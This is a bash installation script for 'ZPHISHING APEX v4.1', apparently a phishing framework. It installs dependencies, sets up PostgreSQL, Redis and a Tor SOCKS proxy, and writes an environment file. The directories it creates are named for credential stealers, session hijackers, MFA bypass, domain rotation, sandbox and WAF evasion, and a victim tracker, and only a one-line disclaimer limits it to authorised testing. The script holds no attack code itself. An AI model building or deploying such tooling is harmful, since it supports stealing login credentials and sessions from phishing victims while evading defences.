#!/bin/bash

# ZPHISHING APEX v4.1 — Installation Script (FIXED)
# Works on Kali Linux, Arch Linux, and all Linux distributions

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   ZPHISHING APEX v4.1 — SECURE EDITION INSTALLER            ║"
echo "╚══════════════════════════════════════════════════════════════╝"

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[!] Please run as root${NC}"
    exit 1
fi

# Detect OS
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$NAME
else
    echo -e "${RED}[!] Cannot detect OS${NC}"
    exit 1
fi

echo -e "${CYAN}[*] Detected OS: $OS${NC}"

# Update system
echo -e "${YELLOW}[*] Updating system...${NC}"
if [[ "$OS" == *"Kali"* ]] || [[ "$OS" == *"Debian"* ]] || [[ "$OS" == *"Ubuntu"* ]]; then
    apt-get update -y
elif [[ "$OS" == *"Arch"* ]]; then
    pacman -Syu --noconfirm
fi

# Install dependencies
echo -e "${YELLOW}[*] Installing dependencies...${NC}"
if [[ "$OS" == *"Kali"* ]] || [[ "$OS" == *"Debian"* ]] || [[ "$OS" == *"Ubuntu"* ]]; then
    apt-get install -y python3 python3-pip python3-venv git curl wget \
        build-essential libssl-dev libffi-dev libxml2-dev libxslt1-dev \
        libjpeg-dev zlib1g-dev libpng-dev tesseract-ocr ffmpeg \
        libsm6 libxext6 libxrender-dev libgl1-mesa-glx libglib2.0-0 \
        chromium-browser nginx docker.io docker-compose \
        postgresql postgresql-contrib redis-server
elif [[ "$OS" == *"Arch"* ]]; then
    pacman -S --noconfirm python python-pip python-virtualenv git curl wget \
        base-devel openssl libffi libxml2 libxslt libjpeg-turbo zlib \
        libpng tesseract tesseract-data-eng ffmpeg libsm libxext \
        libxrender mesa glib2 chromium nginx docker docker-compose \
        postgresql redis
fi

# Create virtual environment (FIXED: don't install globally)
echo -e "${YELLOW}[*] Creating virtual environment...${NC}"
python3 -m venv venv
source venv/bin/activate

# Install Python packages
echo -e "${YELLOW}[*] Installing Python packages...${NC}"
pip install --upgrade pip
pip install -r requirements.txt

# Install Playwright browsers
echo -e "${YELLOW}[*] Installing Playwright browsers...${NC}"
playwright install chromium

# Setup database
echo -e "${YELLOW}[*] Setting up database...${NC}"
if [[ "$OS" == *"Kali"* ]] || [[ "$OS" == *"Debian"* ]] || [[ "$OS" == *"Ubuntu"* ]]; then
    service postgresql start
    sudo -u postgres psql -c "CREATE USER zphishing WITH PASSWORD 'zphishing';" || true
    sudo -u postgres psql -c "CREATE DATABASE zphishing_db OWNER zphishing;" || true
elif [[ "$OS" == *"Arch"* ]]; then
    systemctl start postgresql
    sudo -u postgres psql -c "CREATE USER zphishing WITH PASSWORD 'zphishing';" || true
    sudo -u postgres psql -c "CREATE DATABASE zphishing_db OWNER zphishing;" || true
fi

# Start Redis
echo -e "${YELLOW}[*] Starting Redis...${NC}"
if [[ "$OS" == *"Kali"* ]] || [[ "$OS" == *"Debian"* ]] || [[ "$OS" == *"Ubuntu"* ]]; then
    service redis-server start
elif [[ "$OS" == *"Arch"* ]]; then
    systemctl start redis
fi

# Create directories
echo -e "${YELLOW}[*] Creating directories...${NC}"
mkdir -p templates/{social,corporate,custom,ai_generated}
mkdir -p payloads/{credential_stealer,session_hijacker,mfa_bypass,custom}
mkdir -p evasion/{domain_rotation,fingerprint_spoofer,traffic_obfuscator,sandbox_detector,waf_bypass}
mkdir -p infrastructure/{cloud_deployer,docker_manager,kubernetes_orchestrator,ssl_manager}
mkdir -p api/{rest_api,websocket,graphql}
mkdir -p cli/{interactive,commands}
mkdir -p web/{dashboard,operator_panel,victim_tracker}
mkdir -p utils/{logger,config_manager,crypto_utils,helpers}
mkdir -p docs logs data

# Set permissions
chmod +x zphishing.py
chmod +x install.sh

# FIXED: Generate real secrets
echo -e "${YELLOW}[*] Generating secrets...${NC}"
SECRET_KEY=$(openssl rand -hex 32)
JWT_SECRET=$(openssl rand -hex 32)
ENCRYPTION_KEY=$(openssl rand -base64 32)

# FIXED: Create .env with REAL generated secrets
echo -e "${YELLOW}[*] Creating .env file...${NC}"
cat > .env << EOF
# ZPHISHING APEX Configuration
# Generated on $(date)

FLASK_APP=zphishing.py
FLASK_ENV=production
SECRET_KEY=${SECRET_KEY}
DATABASE_URL=postgresql://zphishing:zphishing@localhost/zphishing_db
REDIS_URL=redis://localhost:6379/0
JWT_SECRET_KEY=${JWT_SECRET}
ENCRYPTION_KEY=${ENCRYPTION_KEY}

# AI API Keys (fill these in if you have them)
OPENAI_API_KEY=
ANTHROPIC_API_KEY=
REPLICATE_API_TOKEN=

# Blockchain (optional)
ETH_RPC=
POLYGON_RPC=
BSC_RPC=

# Cloud Provider Keys (optional)
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
DIGITALOCEAN_TOKEN=
GOOGLE_APPLICATION_CREDENTIALS=
AZURE_SUBSCRIPTION_ID=

# Communication Keys (optional)
TWILIO_ACCOUNT_SID=
TWILIO_AUTH_TOKEN=
SLACK_BOT_TOKEN=
DISCORD_WEBHOOK_URL=
TELEGRAM_BOT_TOKEN=

# Security
TOR_SOCKS_PROXY=socks5://127.0.0.1:9050
EOF

echo -e "${GREEN}[+] Installation complete!${NC}"
echo -e "${CYAN}[*] To start ZPHISHING APEX:${NC}"
echo -e "${YELLOW}    source venv/bin/activate${NC}"
echo -e "${YELLOW}    python3 zphishing.py init-db${NC}"
echo -e "${YELLOW}    python3 zphishing.py create-admin${NC}"
echo -e "${YELLOW}    python3 zphishing.py serve${NC}"
echo ""
echo -e "${PURPLE}[!] For educational and authorized security testing only${NC}"
